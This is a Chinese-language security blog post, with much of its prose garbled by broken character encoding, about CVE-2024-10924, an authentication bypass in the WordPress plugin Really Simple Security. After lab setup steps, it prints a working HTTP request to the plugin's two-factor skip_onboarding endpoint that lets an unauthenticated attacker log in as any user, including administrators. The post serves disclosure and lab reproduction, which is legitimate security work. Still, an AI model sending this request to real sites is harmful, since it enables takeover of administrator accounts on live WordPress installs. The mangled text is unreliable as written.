#  ã€Expã€‘- CVE-2024-10924 WordPressæ’ä»¶Really Simple Securityè®¤è¯ç»•è¿‡æ¼æ´   
åŸåˆ› å®¬å®¤å¸é˜  åŸ‹è—é…±æ²¹ç“¶   2024-11-19 03:49  
  
## ã€ğŸ””ã€‘äº’è”ç½‘èµ„æ–™/å·¥å…·ï¼Œå®‰å…¨æ€§æœªçŸ¥ï¼Œéœ€è¦è‡ªè¡Œç ”åˆ¤å®‰å…¨æ€§ã€‚  
### ä¼ é€  
> https://github.com/m3ssap0/wordpress-really-simple-security-authn-bypass-vulnerable-application?tab=readme-ov-file  
  
## æ¼æ´æè¿°  
> WordPressçš„Really Simple Securityï¼ˆå…è´¹ç‰ˆã€ä¸“ä¸šç‰ˆå’Œå¤šç«™ç‚¹ä¸“ä¸šç‰ˆï¼‰æ’ä»¶åœ¨ç‰ˆæœ¬9.0.0è‡³9.1.1.1ä¸­å­˜åœ¨èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ã€‚è¿™æ˜¯ç”±äºåœ¨åŒå› ç´ REST APIçš„â€œcheck_login_and_get_userâ€å‡½æ•°ä¸­ï¼Œå¯¹ç”¨æˆ·æ£€æŸ¥é”™è¯¯å¤„ç†ä¸å½“æ‰€å¯¼è‡´çš„ã€‚å½“å¯ç”¨â€œåŒé‡èº«ä»½éªŒè¯â€è®¾ç½®ï¼ˆé»˜è®¤ç¦ç”¨ï¼‰æ—¶ï¼Œè¿™ä½¿å¾—æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ç™»å½•åˆ°ç½‘ç«™ä¸Šçš„ä»»ä½•ç°æœ‰ç”¨æˆ·ï¼Œä¾‹å¦‚ç®¡ç†å‘˜ã€‚  
  
## ä¿®å¤å»ºè®®  
> å»ºè®®æ‚¨æ›´æ–°å½“å‰ç³»ç»Ÿæˆ–è½¯ä»¶è‡³æœ€æ–°ç‰ˆï¼Œå®Œæˆæ¼æ´çš„ä¿®å¤ã€‚  
  
## å½±å“èŒƒå›´  
> 9.0.0 - 9.1.1.1 Really Simple Security < 9.1.2  
  
## å¤ç°  
### ç”¨æ³•  
- â€¢  
Â è®¾ç½®ç¯å¢ƒçš„æ­¥éª¤å¦‚ä¸‹ï¼š  
  
```
1.Â Launch./up.shÂ toÂ startÂ composition.
2.CompleteÂ theÂ installationÂ ofÂ WordPressÂ here:Â https://localhost:1337/wp-admin/install.php.
3.LoginÂ intoÂ WordPress.
4.GoÂ toÂ "Plugins":Â https://localhost:1337/wp-admin/plugins.php.
5.ClickÂ onÂ "Activate"Â underÂ theÂ "ReallyÂ SimpleÂ Security"Â plugin.Â DOÂ NOTÂ UPDATEÂ IT,Â sinceÂ weÂ needÂ theÂ vulnerableÂ version.
6.ClickÂ onÂ "Cancel"Â onÂ theÂ popupÂ referringÂ toÂ SSLÂ activation.
7.GoÂ toÂ "Settings">"LoginÂ Protection">"Two-FactorÂ Authentication"Â and,inÂ theÂ "Two-FactorÂ Authentication"Â section,
8.enable"EnableÂ Two-FactorÂ Authentication".
9.ClickÂ theÂ "Save"Â button.
```  
- â€¢Â   
è¯¥å®¹å™¨å°†è¢«ç§°ä¸º vuln-wp-really-simple-security.  
  
- â€¢Â è¦æ‹†å¸ç¯å¢ƒï¼Œè¯·ä½¿ç”¨./down.shå‘½ä»¤æˆ–./down_and_delete.shå‘½ä»¤æ¥åˆ é™¤å›¾åƒå’Œæ•°æ®åº“å·.  
  
## Exploit  
- â€¢Â   
è¦åˆ©ç”¨è¯¥æ¼æ´ï¼Œç±»ä¼¼ä»¥ä¸‹çš„è¯·æ±‚å¯éªŒè¯ï¼š  
  
```
POSTÂ /?rest_route=/reallysimplessl/v1/two_fa/skip_onboardingÂ HTTP/1.1
Host:Â localhost:1337
Content-Type:Â application/json
Content-Length:88
Connection:Â keep-alive

{
"user_id":1,
"login_nonce":"133333337",
"redirect_to":"/wp-admin/"
}
```  
- â€¢Â ç„¶ååœ¨æµè§ˆå™¨ä¸­ç›¸åº”åœ°è®¾ç½®è¿”å›çš„ä¼šè¯cookie.  
  
- â€¢Â user_idå¿…é¡»æ˜¯ç›®æ ‡ç”¨æˆ·çš„ IDï¼Œ login_nonceå¯ä»¥æ˜¯ä»»ä½•å€¼ï¼Œå› ä¸ºé”™è¯¯çš„å€¼ä¸ä¼šé˜»æ­¢è¿›ç¨‹.  
  
## âœ¨å‚è€ƒé“¾æ¥  
1. 1.Â https://plugins.trac.wordpress.org/changeset/3188431/really-simple-ssl  
  
1. 2.Â https://www.cve.org/CVERecord?id=CVE-2024-10924  
  
1. 3.Â https://www.wordfence.com/threat-intel/vulnerabilities/detail/really-simple-security-free-pro-and-pro-multisite-900-9111-authentication-bypass  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aOiar7mEUNloiaTXNgRacTmqVqfic04SpL9tfvFBd7VhZEzLnict8Xju4IeDQLRIS0Ot0GiaxEtYuqdVlpZwibjBFDpQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/aOiar7mEUNlqIeYPL63ftuHYOg5LA6Izamo9VLniaX7pBCa2ATgAoIhOm8DuWwGa17csZQkM3fvZ9vjLCZnI37xA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
